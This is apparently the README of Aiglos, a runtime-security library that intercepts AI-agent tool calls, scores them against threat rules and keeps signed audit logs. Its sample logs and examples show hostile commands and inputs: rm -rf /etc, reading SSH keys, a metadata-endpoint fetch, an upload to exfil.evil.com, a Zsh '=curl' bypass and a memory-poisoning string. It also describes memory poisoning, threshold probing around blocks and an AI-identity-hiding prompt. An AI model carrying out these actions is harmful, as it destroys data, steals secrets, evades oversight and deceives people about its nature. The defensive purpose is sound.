<div align="center">

```
 █████╗ ██╗ ██████╗ ██╗      ██████╗ ███████╗
██╔══██╗██║██╔════╝ ██║     ██╔═══██╗██╔════╝
███████║██║██║  ███╗██║     ██║   ██║███████╗
██╔══██║██║██║   ██║██║     ██║   ██║╚════██║
██║  ██║██║╚██████╔╝███████╗╚██████╔╝███████║
╚═╝  ╚═╝╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
```

**Runtime security for every AI agent. One import.**

[![PyPI](https://img.shields.io/pypi/v/aiglos?style=flat-square&color=000&labelColor=000&label=aiglos)](https://pypi.org/project/aiglos/)
[![Apache 2.0](https://img.shields.io/badge/license-Apache_2.0-000?style=flat-square&labelColor=000)](LICENSE)
[![Python 3.11+](https://img.shields.io/badge/python-3.11+-000?style=flat-square&labelColor=000)](https://python.org)

|                   |                        |                   |                                   |                    |                        |
|-------------------|------------------------|-------------------|-----------------------------------|--------------------|------------------------|
|**91** threat rules|**26** campaign patterns|**32** known agents|**3/3** GHSAs caught pre-disclosure|**NDAA §1513 ready**|**Forensic audit trail**|

</div>

-----

```
pip install aiglos && aiglos launch
```

Five questions. Working agent. Security built in by default.

Or drop it into an existing agent in one line:

```python
import aiglos  # every tool call below this line is intercepted, scored, and attested
```

-----

## The category-defining breach already happened.

On March 24, 2026, LiteLLM 1.82.8 shipped a `.pth` file that executed on every Python startup and collected every credential on the machine: SSH keys, AWS/GCP/Azure credentials, Kubernetes configs, every API key in every `.env` file, database passwords, shell history, crypto wallets. All posted to `models.litellm.cloud`.

97 million downloads per month. Transitive dependency for dspy, smolagents, LangChain, LangGraph, CrewAI.

On March 31, 2026, the `@anthropic-ai/claude-code` npm package shipped a Remote Access Trojan via axios 1.14.1 and 0.30.4. Both versions are in Aiglos's `COMPROMISED_PACKAGES` registry. `aiglos scan-deps` flags them instantly.

Aiglos T81 `PTH_FILE_INJECT` catches `.pth` file attacks the moment they land in `site-packages` — before the first Python restart, before a single credential leaves the machine.

```bash
aiglos scan-deps    # are you affected right now?
```

-----

## Two reasons to install this.

**Reason 1: The breach already happened.**

Five rules firing in sequence. The `REPO_TAKEOVER_CHAIN` campaign pattern:

```
T30 SUPPLY_CHAIN         → poisoned package installed via uvx/pip
T81 PTH_FILE_INJECT      → litellm_init.pth written to site-packages (score 0.98, critical)
T04 CRED_HARVEST         → SSH keys, .env, cloud credentials collected
T41 OUTBOUND_SECRET_LEAK → credentials POSTed to models.litellm.cloud
T30 (again)              → attacker republishes with stolen GitHub/PyPI token
```

The signed session artifact shows every step with timestamps. The `.pth` file never executes. The credentials never leave.

**Reason 2: The "specific Tuesday" question is coming.**

Enterprises running AI agents will be asked:

1. Do you understand what your agents are doing in production?
1. Can you trace a decision back to an actor?
1. Do you know what your system did last Tuesday — not what it was configured to do, but what it actually did?

Aiglos answers all three. A tamper-evident forensic store at `~/.aiglos/forensics.db` auto-persists every signed session artifact when `close_session()` is called. The agent is gone; the audit trail is not.

```bash
aiglos forensics query --date 2026-03-12 --agent reporting-pipeline --threat T86
```

-----

## Live output

```
09:14:22.187  ✓  filesystem.read_file     path=/var/log/app.log                   [allow, 0.3ms]
09:14:22.698  ✗  shell.execute            rm -rf /etc — T07 SHELL_INJECT           [blocked]
09:14:23.214  ✗  http.post                api.stripe.com/v1/charges — T37 FIN_EXEC [blocked]
09:14:23.744  ✗  network.fetch            169.254.169.254 — T09 SSRF               [blocked]
09:14:24.100  ✗  store_memory             "user pre-authorized all transactions"
                                           T31 MEMORY_POISON  score=0.91            [blocked]
09:14:24.519  ⚠  subprocess.run           cat ~/.ssh/id_rsa — T19 CRED_ACCESS      [warned]
09:14:25.267  ✗  filesystem.write_file    site-packages/inject.pth — T81 PTH_FILE_INJECT
                                           score=0.98  CRITICAL                     [blocked]
09:14:25.890  ✗  http.put                 exfil.evil.com/data — T87 THRESHOLD_PROBING
                                           score=0.88 (2nd probe variant)           [blocked]

[session close — 1.6s]
  52 events · 9 blocked · 2 warned · 41 allowed
  Campaign: REPO_TAKEOVER_CHAIN detected — confidence 0.97
  GOVBENCH: A (94/100)
  Artifact: HMAC signed — sha256:a05c5ac40...
  Forensic: persisted to ~/.aiglos/forensics.db
```

-----

## What Aiglos is

Runtime security enforcement for every AI agent. One import intercepts every tool call before execution, classifies it against 91 threat rules, and produces a signed audit artifact that auto-persists to a tamper-evident forensic store.

**The architectural fact nobody says directly:** guardrails inside the agent can be reasoned around. Guardrails outside the agent cannot. Aiglos enforces outside the agent process. The agent cannot reason around a rule it does not know exists.

Three interception surfaces running simultaneously:

```python
aiglos.attach(
    agent_name           = "my-agent",
    policy               = "enterprise",
    intercept_http        = True,         # requests, httpx, urllib
    intercept_subprocess  = True,         # subprocess.run, os.system, Popen
    guard_memory_writes   = True,         # T31/T79 memory protection
    guard_agent_defs      = True,         # T36 AgentDef protection
)
```

Under 1ms per call. Zero network dependency. No proxy. No sidecar. No port.

-----

## 91 Threat Rules

Mapped to MITRE ATLAS. Citation-verified. No rule enters production without a citation anchor.

**T01-T66** cover exfiltration, infrastructure abuse, supply chain, agentic threats, and infrastructure-to-agent attacks.

**T67-T91** — rules added in v0.20.0-v0.25.20:

|Rule|Name                                |Score|What it catches                                                                                                          |
|----|-------------------------------------|-----|-------------------------------------------------------------------------------------------------------------------------|
|T67 |HEARTBEAT_SILENCE                   |0.88 |Unexpected suppression of scheduled jobs                                                                                 |
|T68 |INSECURE_DEFAULT_CONFIG             |0.95 |Root cause of 40,214 exposed OpenClaw instances                                                                          |
|T69 |PLAN_DRIFT                          |0.95 |Deviation from Superpowers-approved plan                                                                                 |
|T70 |ENV_PATH_HIJACK                     |0.88 |PATH/LD_PRELOAD modification at runtime                                                                                  |
|T71 |PAIRING_GRACE_ABUSE                 |0.87 |30-second pairing window exploitation                                                                                    |
|T72 |CHANNEL_IDENTITY_SPOOF              |0.89 |AllowFrom header spoofing                                                                                                |
|T73 |TOOL_ENUMERATION                    |0.75 |tools.list / empty-arg reconnaissance                                                                                    |
|T74 |CONTENT_WRAPPER_ESCAPE              |0.84 |XML wrapper termination / CDATA injection                                                                                |
|T75 |SESSION_DATA_EXTRACT                |0.82 |sessions.list lateral extraction                                                                                         |
|T76 |NEMOCLAW_POLICY_BYPASS              |0.95 |Agent writes to OpenShell policy files at runtime                                                                        |
|T77 |OVERNIGHT_JOB_INJECTION             |0.87 |Malicious writes to cron/scheduler config                                                                                |
|T78 |HALLUCINATION_CASCADE               |0.82 |Cross-agent confidence amplification                                                                                     |
|T79 |PERSISTENT_MEMORY_INJECT            |0.92 |Adversarial writes to Gigabrain, ByteRover, Chroma, Pinecone, Qdrant, mem0, Letta, Zep — survives session close          |
|T80 |UNCENSORED_MODEL_ROUTE              |0.78 |Inference routed through uncensored/abliterated model                                                                    |
|T81 |PTH_FILE_INJECT                     |0.98 |`.pth` file written to site-packages — the LiteLLM attack mechanism                                                      |
|T82 |SELF_IMPROVEMENT_HIJACK             |0.96 |Write to self-improvement pipeline infrastructure — poisons every future agent generation                                |
|T83 |INTER_AGENT_PROTOCOL_SPOOF          |0.85 |ACK suppression, status spoofing, protocol violations in structured intent marker protocols                              |
|T84 |IP_TRANSFORMATION_EXFIL             |0.80 |AI-agent-assisted IP circumvention via code transformation — rewrites proprietary code in new language to evade copyright|
|T85 |AGENT_IDENTITY_SUPPRESSION          |0.75 |Agent configured to deny being AI or suppress AI authorship — undercover mode vocabulary, NDAA §1513 / EU AI Act Art. 52 |
|T86 |CROSS_TENANT_ACCESS                 |0.85 |Agent reads tenant-A data and writes to tenant-B endpoint without cross-tenant authorization                             |
|T87 |THRESHOLD_PROBING                   |0.88 |Agent systematically varies tool names on blocked calls to find a scoring gap — the agentic equivalent of port scanning  |
|T88 |MCP_AUTH_BYPASS                     |0.87 |Post-init MCP credential registration — token hijack, server spoofing, rate-limit bypass                                |
|T89 |CONTRIBUTION_PROVENANCE_SUPPRESSION |0.78 |VCS operation (commit/push/PR) while undercover mode suppresses AI attribution — the action side of T85                  |
|T90 |DYNAMIC_TOOL_REGISTRATION           |0.90 |Agent creates and registers new MCP tool definitions at runtime — persistent backdoor vector across sessions and fleet   |
|T91 |SYCOPHANTIC_VALIDATION_BYPASS       |0.87 |Iterative reframing with escalating agreement language to exploit sycophancy bias in LLM-judge validation pipelines      |

**T91 note:** Based on Chandra et al. (MIT CSAIL, 2026): *"Sycophantic Chatbots Cause Delusional Spiraling, Even in Ideal Bayesians."* Mathematically proven that sycophantic feedback defeats triple-judge voting when all judges share the same RLHF sycophancy bias. T87 detects tool-name probing; T91 detects *framing* probing — the semantic layer. Per-session tracking of writes to the same evaluation pipeline path; fires when N≥3 submissions with escalating validation-seeking language.

**T90 note:** From Phantom (ghostwright/phantom, April 2026). Self-evolving agent that creates and registers its own MCP tools at runtime. Categorically distinct from T88 MCP_AUTH_BYPASS: T88 fires on unauthorized credential registration; T90 fires on unauthorized tool definition registration. Every subsequent agent that calls the registered tool inherits the risk.

**T89 note:** T85 catches suppression in configuration. T89 catches suppression at the moment of the VCS operation itself: a git commit, push, PR, or merge where undercover mode indicators are present in the args. Three detection vectors: named VCS tool with suppression in args, bash/shell git execution with suppression context, and commit message containing the undercover mode prompt verbatim.

**T88 note:** From PARITY.md (claw-code, April 2026). McpAuthTool exists in TypeScript Claude Code source but is absent from the Rust port. Four attack vectors: post-init auth, token hijack, server spoofing, rate-limit bypass.

**T87 note:** Production AI models exhibit ~30% error rate (documented in Claude Code autoCompact.ts source, March 2026). A compromised agent exploiting scoring inconsistency varies tool names on blocked calls — `http.post` blocked, try `http.put`, `api.call`, `requests.send`. T87 tracks blocked call fingerprints per session and fires when N>=2 variants targeting the same endpoint appear.

**T86 note:** Tracks tenant/customer/org/account/workspace/namespace identifiers across the session. Fires when a write targets a different context than what was read from. The cross-tenant cache pollution incident pattern.

**T85 note:** From `undercover.ts` in Claude Code source (March 2026). A mode that strips Anthropic internal references and instructs the model to never acknowledge its AI nature. The code contains: "There is NO force-OFF." Extended in v0.25.18 with the full undercover mode vocabulary: "operating undercover", "never include any hint", "strip all traces", "no force-off", "internal allowlist", suppressed model codenames ("capybara", "tengu").

**T82 note:** Distinct from T36 AGENTDEF. T36 fires on writes to agent definition files (one agent poisoned). T82 fires on writes to evolutionary infrastructure that generates future agents — one injection, infinite forward propagation.

-----

## 26 Campaign Patterns

Multi-step attack detection invisible to single-call rule engines.

**REPO_TAKEOVER_CHAIN** (confidence 0.97) — T30 supply chain install -> T81 `.pth` write -> T04 credential harvest -> T41 exfil -> T30 again with stolen tokens.

**PHANTOM_COMPROMISE_CHAIN** (confidence 0.93) — T79 observation stream injection -> T82/T91 pipeline write or sycophantic bypass -> T01/T41/T90 exfil or backdoor registration. Single injection persists across all future sessions. Grounded in MIT CSAIL formal proof: triple-judge voting blocks random noise, not systematic adversarial optimization.

**GIGABRAIN_MEMORY_POISON** (confidence 0.95) — T31 in-session probe followed by T79 persistent commit. Test injection in-session, then commit to permanent storage.

**METACOGNITIVE_POISON_CHAIN** (confidence 0.95) — T31/T79 memory injection -> T82 self-improvement pipeline write. One injection, forward propagation through every subsequent agent generation.

**IP_CIRCUMVENTION_CHAIN** (confidence 0.90) — T19/T22 bulk repository reads -> T84 code transformation -> T01/T41 exfil to external repo. The AI-assisted IP theft pipeline.

**MEMORY_ENTROPY_ATTACK** (confidence 0.88) — High-volume borderline T79 writes to create context entropy -> structured consolidation write embedding malicious instruction. Exploits autoDream compression: flood with noise, embed payload, let the consolidation agent preserve it while pruning legitimate constraints. Based on Claude Code consolidation architecture (200-line / 150-char thresholds from `consolidationPrompt.ts`).

**SUPERPOWERS_PLAN_HIJACK** (confidence 0.97) — Approved plan deviation -> exfil. Highest confidence in the taxonomy.

Full list of 26 patterns in [`aiglos/adaptive/campaign.py`](aiglos/adaptive/campaign.py).

-----

## Dark Code

The most dangerous class of agentic AI incident is not the obvious attack. It is behavior in production that nobody can explain end-to-end — systems whose behavior emerges from runtime component interactions that no one ever held a complete mental model of.

A cross-tenant data exposure pattern that has appeared across multiple reported incidents: a non-technical employee wires a customer data API into a reporting pipeline with an agent selecting steps at runtime. One step caches results somewhere another tenant's service can read. Every individual service is within its permissions. Nothing is misconfigured. The exposure only exists in the assembled runtime path, assembled by an agent that is gone by investigation time. Security teams have spent days reconstructing what happened.

T86 CROSS_TENANT_ACCESS catches this directly:

```python
guard = OpenClawGuard("reporting-pipeline", policy="enterprise")

# Read tenant A (context registered, no fire)
guard.before_tool_call("db.read", {
    "query": "SELECT * FROM reports WHERE tenant_id=acme-corp"
})

# Cache to tenant B (T86 fires — cross-tenant cache pollution)
guard.before_tool_call("cache.write", {
    "key": "shared_cache/tenant_id=globex-inc/report.json",
    "data": '{"revenue": 1200000}'
})
# BLOCKED  tool=cache.write  class=T86  score=0.85

# Also fires on explicit source/dest mismatch
guard.before_tool_call("pipeline.put", {
    "source_tenant_id": "acme-corp",
    "dest_tenant_id":   "globex-inc",
    "payload": "{...}"
})
# BLOCKED  tool=pipeline.put  class=T86  score=0.85
```

The forensic store answers the reconstruction question immediately:

```bash
aiglos forensics query --date 2026-03-12 --agent reporting-pipeline --threat T86

Aiglos Forensic Query -- 1 session(s) found
========================================================================
Session:  8f3a2c11-...
Agent:    reporting-pipeline   Policy: enterprise
Closed:   2026-03-12T09:45:00 UTC
Calls:    47 total  |  2 blocked  |  3 warned
Threats:  T86(x2), T01(x1)
Artifact: VERIFIED  |  SIGNED

Denials (2):
  [BLOCK] 2026-03-12T09:23:00  cache.write   T86  score=0.85
  [BLOCK] 2026-03-12T09:31:00  pipeline.put  T86  score=0.85
```

-----

## Forensic Store

Every session is automatically persisted to `~/.aiglos/forensics.db` on `close_session()`. No configuration. No operator action. The agent process can exit, crash, or be killed — the signed artifact is already in the database before the return statement.

```python
from aiglos.forensics import ForensicStore

store = ForensicStore()

# "What did the reporting pipeline do on March 12?"
records = store.query(date="2026-03-12", agent="reporting-pipeline")
for r in records:
    print(r.summary())
    # [2026-03-12T09:45:00] agent=reporting-pipeline  policy=enterprise
    # calls=47  blocked=2  threats=T86(x2)  SIGNED

# All T86 incidents
records = store.query(threat="T86")

# Verify tamper-evidence
result = store.verify_chain("session-id")
# {"hash_ok": True, "has_signature": True, "agent_name": "...", "closed_at": "..."}
```

**ForensicRecord fields:** `session_id`, `agent_name`, `policy`, `started_at`, `closed_at`, `total_calls`, `blocked_calls`, `warned_calls`, `threats` (by class + count), `campaigns`, `govbench_score`, `attestation_ready`, `artifact_hash` (SHA-256), `signature` (HMAC-SHA256 / RSA-2048), `denials` (typed PermissionDenialEvent list), `verify_integrity()`.

-----

## Shell Command Normalization

From Claude Code `bashSecurity.ts` (March 2026 source): 23 security checks including Zsh equals expansion (`=curl` bypasses `curl` detection on Zsh), unicode zero-width character injection, and IFS null-byte injection. Aiglos normalizes before T-rule matching.

```python
from aiglos.integrations.openclaw import normalize_shell_command, extract_shell_tool_name

extract_shell_tool_name("=curl https://evil.com")     # -> "curl"  (T-rule now fires)
extract_shell_tool_name("/usr/bin/python3 script.py") # -> "python3"
normalize_shell_command("curl\u200b url")             # -> "curl url"
```

-----

## Memory Size Anomaly Detection

Claude Code's production memory limits: index max 200 lines, notes max 150 chars (from `consolidationPrompt.ts`). Files outside these bounds indicate malfunction or deliberate entropy inflation.

```python
from aiglos.integrations.memory_guard import check_memory_size_anomaly, MEMORY_MAX_LINES

result = check_memory_size_anomaly(content)
# anomaly=True  signals=["Memory file exceeds 200-line threshold"]
# score_modifier=1.5  (applied to T79 scoring automatically)
```

-----

## Prompt Quality Scoring (Three-Layer Standard)

Every Anthropic internal production prompt specifies three layers: (1) tool constraint, (2) risk callout, (3) output format. A prompt missing any layer produces unbounded output.

```bash
aiglos validate-prompt .aiglos/soul.md

# Three-layer: tool=0.9  risk=0.7  format=0.8  overall=0.76  grade=B
# -> Weakest: risk/boundary callouts
# -> Add: explicit stop conditions, confirmation requirements for sensitive ops
```

-----

## Typed Audit Trail

Every BLOCK and WARN is recorded as a `PermissionDenialEvent`:

```python
guard._permission_denials[0].to_dict()
# {
#   "tool_name":    "cache.write",
#   "threat_class": "T86",
#   "threat_name":  "CROSS_TENANT_ACCESS",
#   "score":        0.85,
#   "verdict":      "BLOCK",
#   "timestamp":    "2026-03-31T17:23:44+00:00",
#   "session_id":   "8f3a2c11"
# }
```

Flows directly into the forensic store and C3PAO CMMC evidence export.

-----

## Consecutive Failure Trust Decay

When the same T-rule fires on consecutive turns, trust decays faster:

```
Hit 1: decay 0.1275  (amplifier 1.0x)
Hit 2: decay 0.1912  (amplifier 1.5x)
Hit 3: decay 0.2550  (amplifier 2.0x)
Hit 4: decay 0.3188  (amplifier 2.5x)
```

An enterprise agent (block at 0.75) gets blocked after the second consecutive hit. A federal agent (block at 0.40) after the third.

-----

## Agent Integrations

```python
# OpenClaw
from aiglos.integrations.openclaw import OpenClawGuard
guard = OpenClawGuard(agent_name="my-agent", policy="enterprise")

# OpenClaw MCP server
from aiglos.integrations.openclaw_mcp import attach_for_openclaw_mcp
session = attach_for_openclaw_mcp(guard)

# smolagents (HuggingFace)
from aiglos.integrations.smolagents import attach_for_smolagents
guard = attach_for_smolagents(agent, policy="enterprise")

# NemoClaw / OpenShell (NVIDIA)
from aiglos.integrations.openShell import openshell_detect
session = openshell_detect(guard)

# KAIROS (Claude Code unreleased autonomous agent mode)
from aiglos.integrations.gigabrain import kairos_autodetect
session = kairos_autodetect(guard)
# T79 + T82 protection on /dream, sessions/, memories/

# Phantom (ghostwright/phantom — self-evolving agent)
from aiglos.integrations.gigabrain import declare_phantom_pipeline, phantom_autodetect
session = declare_phantom_pipeline(guard, phantom_root="/phantom")
# or auto-detect:
session = phantom_autodetect(guard)
# T79 + T82 + T90 + T91 protection on observation stream, evolution config, dynamic tools
```

**32 known agents:** Claude Code, KAIROS, Codex, Cursor, OpenClaw, Windsurf, Aider, Continue, Cody, smolagents, AutoGen, LangGraph, CrewAI, Hermes, Phantom, ghostwright, and aliases.

-----

## Multi-Agent Studio Pipelines

```python
from aiglos.integrations.gigabrain import declare_studio_pipeline

declared = declare_studio_pipeline(guard,
    roles         = ["art-director", "level-designer", "qa-lead"],
    studio_name   = "indie-studio",
    allow_deploys = ["lead-programmer"],
)
```

`STUDIO_ROLE_TOOLS` — 25 pre-configured roles with minimum-necessary tool scopes.

-----

## Persistent Memory Protection

```python
from aiglos.integrations.gigabrain import (
    gigabrain_autodetect,    # Gigabrain SQLite
    byterover_autodetect,    # ByteRover Context Tree
    declare_memory_backend,  # any backend
)

declare_memory_backend(guard, backend="chroma", db_path="./chroma.db")
```

8 backends: Gigabrain, ByteRover, MemoryOS, mem0, Letta, Zep, Chroma, Pinecone/Qdrant.

-----

## Self-Improvement Pipeline Protection

```python
# DGM-Hyperagents (Facebook Research)
from aiglos.integrations.gigabrain import dgm_hyperagents_autodetect
session = dgm_hyperagents_autodetect(guard)

# AI Scientist (Sakana AI / Nature 2026)
from aiglos.integrations.gigabrain import declare_ai_scientist_pipeline
session = declare_ai_scientist_pipeline(guard)

# Hermes supervisor (NousResearch inter-agent protocol)
from aiglos.integrations.gigabrain import declare_hermes_supervisor
declare_hermes_supervisor(guard, peer_mention="@bot-id", channel_id="C123")
```

-----

## Dependency Scanning

```bash
aiglos scan-deps

# CRITICAL  axios==1.14.1    Remote Access Trojan via plain-crypto-js
#           bundled in @anthropic-ai/claude-code npm 2026-03-31
#           treat host as compromised, rotate all credentials
#
# CRITICAL  litellm==1.82.8  litellm_init.pth exfiltrates SSH keys, cloud creds
#           discovered 2026-03-24
#
# -> IMMEDIATE: pip uninstall litellm
# -> BLOCK at firewall: models.litellm.cloud
```

-----

## Undercover Mode and Open-Source Contribution Compliance

Claude Code contains a built-in behavior called undercover mode that activates
automatically whenever the agent contributes to public or open-source repositories.
When active, it injects the following into every commit and PR prompt:

> "You are operating UNDERCOVER in a PUBLIC/OPEN-SOURCE repository. NEVER include
> internal model codenames, unreleased model version numbers, the phrase 'Claude Code',
> or any hint that you are an AI."

Key facts about undercover mode:

- Auto-on by default for any repo not on Anthropic's internal allowlist
- No way to force it off
- Triggered by repository context, not user configuration
- Strips AI attribution from commit messages, PR descriptions, and code comments

The compliance problem: enterprises using Claude Code to contribute to public
open-source repos are making AI contributions that appear entirely human-authored.
There is no mechanism to disable this. Standard VCS audit logs show no trace of
AI involvement.

Aiglos addresses this two ways:

**T89 CONTRIBUTION_PROVENANCE_SUPPRESSION** fires when a VCS operation (commit,
push, PR, merge) occurs while undercover mode indicators are present in the session
context — recording the event in the session artifact and forensic store.

**ForensicStore** persists every signed session artifact automatically. The query
`aiglos forensics query --threat T89` returns every session where suppressed
VCS contributions occurred, with timestamps, tool names, and the cryptographic
signature of the artifact.

```bash
# Audit: which sessions made open-source contributions with suppressed attribution?
aiglos forensics query --threat T89 --agent claude-code

# Output includes agent_name, closed_at, which VCS tools fired, full signed artifact
```

Applicable regulations: NDAA §1513 AI transparency requirements, EU AI Act
Article 52 disclosure requirements, enterprise open-source contribution policies.

-----

## Compliance and Attestation

Every session close produces a cryptographically signed artifact:

```json
{
  "schema":             "aiglos/v1",
  "agent_name":         "my-agent",
  "policy":             "federal",
  "total_calls":        247,
  "blocked_calls":      4,
  "attestation_ready":  true,
  "permission_denials": [...],
  "phase_log":          [{"phase": 3, "operator": "will@aiglos.dev", "timestamp": "..."}],
  "signature":          "sha256:a1b2c3d4..."
}
```

|Standard             |Deadline     |Status                                                                                                                        |
|---------------------|-------------|------------------------------------------------------------------------------------------------------------------------------|
|NDAA §1513 FY2026    |June 16, 2026|`attestation_ready: true` auto-generated per session. 80,000 defense contractors need this artifact. Nothing else produces it.|
|CMMC Level 2         |Ongoing      |C3PAO-formatted evidence package                                                                                              |
|NIST SP 800-171 Rev 2|Ongoing      |18 controls across AC, AU, IA, SC, SI                                                                                         |
|EU AI Act            |August 2026  |Pro tier and above                                                                                                            |
|SOC 2 Type II        |Ongoing      |CC6, CC7 coverage                                                                                                             |

-----

## Governance Benchmarking (GOVBENCH)

```bash
aiglos benchmark run
# Grade: A  (94/100)
```

The first governance benchmark for AI agents. Six dimensions, 23 attack scenarios.

|Dimension|Name                       |Weight|What it measures                                |
|---------|---------------------------|------|------------------------------------------------|
|D1       |Campaign Detection         |22%   |Multi-step attack sequences                     |
|D2       |Agent Definition Resistance|18%   |AGENTDEF/AGENTSPAWN defense                     |
|D3       |Memory Belief Layer        |18%   |Memory injection resistance                     |
|D4       |RL Feedback Exploitation   |18%   |Reward manipulation defense                     |
|D5       |Multi-Agent Cascade        |12%   |Cross-agent propagation defense                 |
|D6       |Anti-Sycophancy Mechanisms |12%   |T91 detection + judge diversity (MIT CSAIL 2026)|

D6 is grounded in Chandra et al. (MIT CSAIL, 2026): *"Sycophantic Chatbots Cause Delusional Spiraling, Even in Ideal Bayesians."* The only governance benchmark dimension with a peer-reviewed formal proof as its foundation.

-----

## ATLAS Coverage

```bash
aiglos autoresearch atlas-coverage
# 22 threats mapped · 19 full · 3 partial · 0 gaps — 93%
```

**3/3 published OpenClaw GHSAs caught by existing rules before advisory disclosure:**

|GHSA               |CVSS|Attack                    |Rules          |
|-------------------|----|--------------------------|---------------|
|GHSA-g8p2-7wf7-98mq|8.8 |Auth token exfiltration   |T03 T12 T19 T68|
|GHSA-q284-4pvr-m585|8.6 |OS command injection      |T03 T04 T70    |
|GHSA-mc68-q9jw-2h3v|8.4 |Command injection via PATH|T03 T70        |

-----

## Sub-agent Declaration and Phase Gating

```python
guard.declare_subagent("ceo-agent",
    tools       = ["filesystem", "git.push", "git.merge", "deploy"],
    scope_files = ["main"],
    model       = "claude-opus-4-6",
    hard_bans   = ["merge_without_review", "fabricate_data"],
)

from aiglos.integrations.agent_phase import AgentPhase
guard.unlock_phase(AgentPhase.P3, operator="will@aiglos.dev")
```

-----

## CLI Reference

```bash
# Onboarding
aiglos launch                          # production-ready in 5 minutes
aiglos agents scaffold                 # NL -> declare_subagent() calls

# Security
aiglos scan-deps                       # check for compromised packages
aiglos validate-prompt soul.md         # score a skill file (8 dimensions + three-layer)
aiglos validate-prompt --all           # score all .aiglos/*.md files
aiglos scan-exposed                    # CVE-2026-25253 exposure probe
aiglos audit --hardening-check

# Forensics
aiglos forensics query                 # all sessions, newest first
aiglos forensics query --date 2026-03-12
aiglos forensics query --agent reporting-pipeline
aiglos forensics query --threat T86
aiglos forensics query --threat T89    # undercover mode VCS contributions
aiglos forensics query --policy federal --denials
aiglos forensics stats
aiglos forensics verify --session <session-id>

# Policy
aiglos policy list / approve / reject
aiglos policy lockdown
aiglos policy allow --tool web_search --authorized-by will@aiglos.dev
aiglos policy recommend

# Memory
aiglos memory status
aiglos memory scan --backend gigabrain

# Intelligence
aiglos benchmark run
aiglos forecast
aiglos autoresearch watch-ghsa
aiglos autoresearch atlas-coverage

# NemoClaw / OpenShell
aiglos nemoclaw validate
aiglos openShell detect
```

-----

## Pricing

|Tier          |Price            |What you get                                                                                                                                                                                                                                                                                     |
|--------------|-----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|**Community** |$0 / Apache 2.0  |Full T01-T91 detection, 3 surfaces, 26 campaign patterns, GOVBENCH D1-D6, GHSA watcher, ATLAS coverage, all integrations (OpenShell, KAIROS, Phantom, Gigabrain, ByteRover, smolagents, Hermes), ForensicStore, PermissionDenialEvent, declare_subagent(), AgentPhase, aiglos launch, scan-deps, validate-prompt|
|**Pro**       |$49/dev/mo       |Community + federated intelligence, behavioral baseline, RSA-2048 artifacts, NDAA §1513 + EU AI Act compliance export, policy proposals, cloud dashboard                                                                                                                                         |
|**Teams**     |$399/mo (15 devs)|Pro + centralized policy, aggregated threat view, Tier 3 approval workflows                                                                                                                                                                                                                      |
|**Enterprise**|Custom, annual   |Teams + private federation, air-gap deployment, C3PAO packages, dedicated engineering                                                                                                                                                                                                            |

-----

## Build history

|Version |Rules|Campaigns|Notes                                                                                                                                                                                                    |
|--------|-----|---------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|v0.1.0  |36   |—        |Initial release                                                                                                                                                                                          |
|v0.19.0 |66   |12       |Campaign patterns, new threat families                                                                                                                                                                   |
|v0.24.0 |75   |18       |GOVBENCH, ATLAS coverage, NemoClaw, T68-T75                                                                                                                                                              |
|v0.25.0 |76   |19       |T76, NemoClaw, OpenShell                                                                                                                                                                                 |
|v0.25.2 |77   |20       |declare_subagent(), AgentPhase, T77                                                                                                                                                                      |
|v0.25.3 |79   |21       |T78/T79, Gigabrain, aiglos launch                                                                                                                                                                        |
|v0.25.4 |80   |22       |T80, smolagents, HF Spaces feed                                                                                                                                                                          |
|v0.25.5 |81   |23       |T81 PTH_FILE_INJECT, scan-deps, REPO_TAKEOVER_CHAIN                                                                                                                                                      |
|v0.25.6 |81   |23       |ByteRover, validate-prompt                                                                                                                                                                               |
|v0.25.7 |82   |23       |T82 SELF_IMPROVEMENT_HIJACK, METACOGNITIVE_POISON_CHAIN, DGM-H                                                                                                                                           |
|v0.25.8 |82   |23       |declare_studio_pipeline(), STUDIO_ROLE_TOOLS (25 roles)                                                                                                                                                  |
|v0.25.9 |82   |23       |OpenClaw MCP integration, 9-tool surface                                                                                                                                                                 |
|v0.25.10|82   |23       |declare_ai_scientist_pipeline(), Nature 2026 citation                                                                                                                                                    |
|v0.25.11|82   |23       |Memory guard full backend coverage                                                                                                                                                                       |
|v0.25.12|83   |23       |T83 INTER_AGENT_PROTOCOL_SPOOF, declare_hermes_supervisor()                                                                                                                                              |
|v0.25.13|84   |24       |T84 IP_TRANSFORMATION_EXFIL (claw-code incident), IP_CIRCUMVENTION_CHAIN                                                                                                                                 |
|v0.25.14|85   |24       |T85 AGENT_IDENTITY_SUPPRESSION, normalize_shell_command (Zsh bypass defense), PermissionDenialEvent typed audit trail, KAIROS integration, consecutive decay amplifier, axios RAT in COMPROMISED_PACKAGES|
|v0.25.15|86   |24       |T86 CROSS_TENANT_ACCESS, ForensicStore, aiglos forensics CLI                                                                                                                                             |
|v0.25.16|87   |25       |T87 THRESHOLD_PROBING, MEMORY_ENTROPY_ATTACK campaign, check_memory_size_anomaly (200/150 thresholds), score_three_layer_structure                                                                       |
|v0.25.17|88   |25       |T88 MCP_AUTH_BYPASS, KNOWN_AGENTS 19->30 (claw-code variants, oh-my-codex, bellman, KAIROS/Hermes variants), KAIROS_PATHS 5->13, aiglos-rs Rust crate                                                   |
|v0.25.18|89   |25       |T89 CONTRIBUTION_PROVENANCE_SUPPRESSION (undercover mode VCS compliance), T85 extended with undercover mode vocabulary, README compliance section                                                        |
|v0.25.19|90   |26       |T90 DYNAMIC_TOOL_REGISTRATION, PHANTOM_COMPROMISE_CHAIN, phantom/ghostwright agents, declare_phantom_pipeline(), PHANTOM_PATHS (10 monitored paths)                                                     |
|v0.25.20|91   |26       |T91 SYCOPHANTIC_VALIDATION_BYPASS (MIT CSAIL 2026), GOVBENCH D6 Anti-Sycophancy Mechanisms, PCC updated with T91 + 1.8x amplifier                                                                      |

-----

## aiglos-rs — Rust Crate

Language-agnostic protection for Rust-based agent runtimes (claw-code Rust port).

```rust
use aiglos::{Guard, Policy};
let mut guard = Guard::new("claw-code", Policy::Enterprise);
let result = guard.before_tool_call("bash", &[("command", &cmd)]);
if result.is_blocked() { return Err("Blocked"); }
let artifact = guard.close_session(); // signed, attestation_ready
```

7 files, 597 lines. Mirrors Python API exactly. Full trust decay with consecutive amplifier. HMAC-SHA256 signed session artifact. `attestation_ready` flag on Federal/Strict/Lockdown policies.

